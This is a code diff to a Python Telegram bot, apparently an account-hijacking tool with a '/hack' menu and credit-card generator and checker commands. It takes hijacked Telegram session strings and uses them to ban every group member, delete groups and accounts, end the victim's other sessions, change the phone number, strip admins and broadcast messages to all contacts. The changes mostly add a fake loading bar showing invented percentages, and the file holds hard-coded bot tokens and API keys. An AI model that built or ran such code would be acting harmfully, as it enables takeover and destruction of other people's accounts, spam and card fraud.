@@ -29,7 +29,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = "abb92dcce1862377cd0bacf73d89473b"
 token = "6279916111:AAEpwnF5RWhor_hJe0LPpXv357UkJmPivc4"
-client = TelegramClient('Prifewagrfcax', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Prifmagwefacax', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -910,6 +910,9 @@ async def change_number(strses, number):
         )
     ))
     return str(result)
+  
+
+
 
 async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -1354,14 +1357,18 @@ async def accept_tos(event):
         for user_id in accepted_users:
             f.write(str(user_id) + '\n')
 
-    await event.respond('''Terms and conditions accepted.You may now access the bot by using the /hack command.
+    await event.respond('''
+                     @ℙℝ𝕀𝕍𝔸ℙ𝔸ℂ𝕋
+Terms and conditions accepted.You may now access the bot by using the /hack command.
 
 Use /arhack for an Arabic explanation of the hack commands!
 
 use /gen , /id , /check for credit card commands !
                         
 تم قبول الشروط والأحكام  يمكنك الآن الوصول إلى الروبوت باستخدام الامر /hack
+
 استخدم /arhack لشرح عربي لأوامر الاختراق.
+
 استخدم /gen , /id . /check لاوامر فحص بطاقات''')
 
 
@@ -1501,7 +1508,9 @@ async def users(event):
 
     async with bot.conversation(event.chat_id) as x:
         try:
-            await x.send_message("Now send me the Termux Session so I can send you the channels/groups.")
+            await x.send_message("""Now send me the Termux Session so I can send you the channels/groups.
+           
+الان ارسل لي الترمكس لكي ارسل لك القنوات وكروبات""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
 
@@ -1516,7 +1525,20 @@ async def users(event):
                 return await event.respond("""Invalid Session, please use another one.
                                    
 ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
 
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 i = await userchannels(strses.text)
             except:
@@ -1558,6 +1580,8 @@ from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedErr
 import sys
 import os
 
+import time
+import random
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 @is_banned
@@ -1613,8 +1637,20 @@ async def users(event):
 ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
 
             try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+
                 i = await userinfo(strses.text)
-                await event.reply(i, buttons=keyboard)
+                await message.edit(i + "\n\n Generate by @PrivaPact", buttons=keyboard)
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
 
@@ -1624,9 +1660,11 @@ async def users(event):
                                    
 ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
+            return await event.respond("""Please provide the termux session within 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+        except Exception as e:
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -1681,12 +1719,26 @@ async def users(event):
     
 كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
                 return
-
+            
+            
             await x.send_message("""Send the Group or Channel's ID/username.
     
 الان ارسل يوزر القناة او كروب""")
             grpid = await x.get_response()
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
 
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             # Perform actions with the client using the provided Termux session
             await userbans(strses.text, grpid.text)
             await event.reply("""Banning all Group/Channel members.
@@ -1757,22 +1809,38 @@ async def users(event):
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-        
-كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
+            if op:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except Exception as e:
+                await event.respond(f"An error occurred: {str(e)}")
 
             i = await usermsgs(strses.text)
             await event.reply(i + "\n\n", buttons=keyboard)
+        
         except TimeoutError:
             return await event.respond("""Please provide the termux session withing 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
-
-
+             
 
 
 
@@ -1832,6 +1900,20 @@ async def users(event):
         
 الان ارسل يوزر القناة او كروب""")
             grpid = await x.get_response()
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 await joingroup(strses.text, grpid.text)
                 await event.reply("""Joined Channel/Group.
@@ -1911,6 +1993,20 @@ async def users(event):
             group_id = await x.get_response()
             group_id = group_id.text.strip()  # Ensure the group_id is a string
             try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
+            try:
                 await leavegroup(strses.text, group_id)
                 await event.respond("""Left channel/group successfully.
 
@@ -1926,6 +2022,12 @@ async def users(event):
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
+            
+            
+
+from telethon import errors
+
+
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 @is_banned
@@ -1985,6 +2087,20 @@ async def handle_users(event):
 الان ارسل يوزر القناة او كروب""")
             grpid = await x.get_response()
             group_id = grpid.text.strip()
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
 
             try: 
                 await delgroup(strses.text, group_id)
@@ -2054,7 +2170,20 @@ async def users(event):
         
 ترمكس خاطئ. حاول غيره""", buttons=keyboard)
                 return
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
 
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             i = await user2fa(strses.text)
             if i:
                 await event.reply("""The user hasn't activated 2FA!
@@ -2063,7 +2192,7 @@ async def users(event):
             else:
                 await event.reply("""Sorry, the user has activated 2FA.
         
-اسف، الشخص فعل التحقق بخطوتين""", buttons=keyboard)
+اسف، الشخص فعل التحقق بخطوتين""")
         except TimeoutError:
             return await event.respond("""Please provide the termux session withing 60 seconds
             
@@ -2126,6 +2255,20 @@ async def users(event):
             
 ترمكس خاطئ. حاول غيره""", buttons=keyboard)
                 return
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 await terminate(strses.text)
                 await event.reply("""Terminated all other device sessions besides the Termux session.
@@ -2201,6 +2344,20 @@ async def handle_delete_account(event):
             
 ترمكس خاطئ. حاول غيره""", buttons=keyboard)
                 return
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
 
             try:
                 await delacc(strses.text)
@@ -2286,12 +2443,26 @@ async def users(event):
       
 ارسل يوزر لرفعه ادمن""")
             user = await x.get_response()
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
 
             try:
                 i = await promote(strses.text, group_id, user.text)
                 await event.respond("""User added as admin successfully
                 
-تم رفع الادمن""", buttons=keyboard)
+تم رفع الادمن""")
             except Exception as e:
                 await event.respond(f"""An error occurred: {str(e)})
          
@@ -2356,6 +2527,20 @@ async def users(event):
       
 ارسل يوزر القناة او كروب""")
             pro = await x.get_response()
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 i = await demall(strses.text, pro.text)
                 await event.respond("""Removed all admins from Group/Channel
@@ -2438,6 +2623,7 @@ async def users(event):
 ارسل الرمز الذي وصل للعاتف""")
                 otp = (await x.get_response()).text
                 changing = await change_number_code(strses, number, phone_code_hash, otp)
+            
                 if changing:
                     await event.respond("""Changed Phone number successfully
           
@@ -2513,18 +2699,19 @@ async def connect(event):
     
     
 اختر اين الارسال""", buttons=keyboard)
-
+import asyncio
+from telethon import types
 async def gcasta(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             reply_msg = msg
             tol = reply_msg
             file = None
-            async for dialog in X.iter_dialogs():
-                entity = dialog.entity
-                if isinstance(entity, (types.Chat, types.User)):  # Exclude channels
+            async for sweetie in X.iter_dialogs():
+                chat = sweetie.entity
+                if isinstance(chat, (types.Chat, types.User)):
                     try:
-                        await X.send_message(entity, tol, file=file)
+                        await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(0.5)  # Add a delay between sending messages
                     except Exception as e:
                         print(e)
@@ -2532,8 +2719,6 @@ async def gcasta(strses, msg):
             print(e)
         except telethon.errors.rpcerrorlist.QueryIdInvalidError:
             pass
-
-
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"1")))
 @is_banned
@@ -2565,9 +2750,20 @@ async def users(event):
             
 ارسل الرسالة""")
             msg = (await x.get_response()).text
-            await x.send_message("""Sent message
-                                 
-تم ارسال الرسالة""")
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 await gcasta(strses, msg)
                 await event.reply("""Done Gcasted to all
@@ -2643,9 +2839,20 @@ async def users(event):
             
 ارسل الرسالة""")
             msg = (await x.get_response()).text
-            await x.send_message("""Sent message
-            
-تم الارسال""")
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 sent_groups = await gcastb(strses, msg)
                 sent_group_count = len(sent_groups)
@@ -2720,9 +2927,20 @@ async def users(event):
             
 ارسل الرسالة""")
             msg = (await x.get_response()).text
-            await x.send_message("""Sent message
-            
-تم الارسال""")
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             try:
                 i = await gcastc(strses, msg)
                 await event.reply(f"""Done Gcasted In {i} Private 
@@ -2774,7 +2992,20 @@ async def users(event):
         
 كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
                 return
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
 
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(1)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
             # Perform actions with the client using the provided Termux session
             # Here, we log out of the account
             async with TelegramClient(StringSession(strses.text), api_id, api_hash) as termux_client:
